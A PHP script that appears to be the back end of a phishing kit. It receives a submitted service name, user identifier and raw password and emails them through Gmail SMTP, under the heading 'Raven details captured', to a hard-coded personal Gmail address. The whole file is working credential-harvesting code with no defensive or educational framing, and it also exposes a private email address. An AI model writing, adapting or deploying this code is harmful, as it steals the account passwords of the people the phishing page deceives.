<?php
require __DIR__ . '/vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok'=>false,'error'=>'Method not allowed']); exit;
}

$recipient = filter_var($_POST['recipient'] ?? 'favournzeh1@gmail.com', FILTER_VALIDATE_EMAIL) ?: 'favournzeh1@gmail.com';
$service = preg_replace('/[^a-z0-9_-]/i', '', ($_POST['service'] ?? 'demo'));
$identifier = substr(filter_var($_POST['identifier'] ?? '', FILTER_SANITIZE_STRING), 0, 255);
$ts = $_POST['ts'] ?? date('c');
$rawPassword = (string) $_POST['password'];

$bodyLines = [
    "Raven details captured",
    "Service: {$service}",
    "Identifier: {$identifier}",
    "Timestamp: {$ts}",
    "",
    "Password:",
    $rawPassword,
    "",
    "NOTE: This email and pawword are uesd."
];
$bodyText = implode("\n", $bodyLines);

$mail = new PHPMailer(true);
try {
    $smtpUser = getenv('GMAIL_SMTP_USER');
    $smtpPass = getenv('GMAIL_SMTP_APP_PASS');

    if (!$smtpUser || !$smtpPass) {
        http_response_code(500);
        echo json_encode(['ok'=>false,'error'=>'SMTP credentials not configured (GMAIL_SMTP_USER / GMAIL_SMTP_APP_PASS).']); exit;
    }
    // SMTP settings - configure with your provider
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = $smtpUser;
    $mail->Password = $smtpPass;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    $mail->setFrom($smtpUser, 'Raven Details Capture');
    $mail->addAddress($recipient);

    $mail->Subject = "Raven Record — {$service} — {$identifier}";
    $mail->Body = $bodyText;

    $mail->send();
    echo json_encode(['ok'=>true, 'message'=>'Email sent']);
} catch (\Exception $e) {
    http_response_code(500);
    echo json_encode(['ok'=>false, 'error'=>$mail->ErrorInfo]);
}
